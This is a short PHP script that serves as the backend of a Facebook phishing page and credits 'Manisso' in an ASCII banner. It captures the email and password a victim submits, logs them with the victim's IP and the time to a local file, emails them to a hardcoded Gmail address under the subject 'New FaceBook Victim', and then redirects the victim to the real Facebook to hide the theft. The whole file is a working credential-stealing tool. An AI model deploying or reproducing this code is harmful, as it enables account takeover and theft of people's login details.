<?php
#   _____ _  ___  ___            _       _     _     _ _        
#  |  ___| | |  \/  |           (_)     | |   (_)   | (_)       
#  | |__ | | | .  . | ___  _   _ _  __ _| |__  _  __| |_ _ __   
#  |  __|| | | |\/| |/ _ \| | | | |/ _` | '_ \| |/ _` | | '_ \  
#  | |___| | | |  | | (_) | |_| | | (_| | | | | | (_| | | | | | 
#  \____/|_| \_|  |_/\___/ \__,_| |\__,_|_| |_|_|\__,_|_|_| |_| 
#                              _/ | By Manisso                             
#                             |__/                                                                                                                         
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Facebook Login ==========\n";
$message .= "User: ".$_POST['email']."\n";
$message .= "Pass: ".$_POST['pass']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "manissospam@gmail.com";
$subject = "New FaceBook Victim | $ip";
$headers = "From: FaceBook";
$file = fopen("logs.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.facebook.com/");


?>
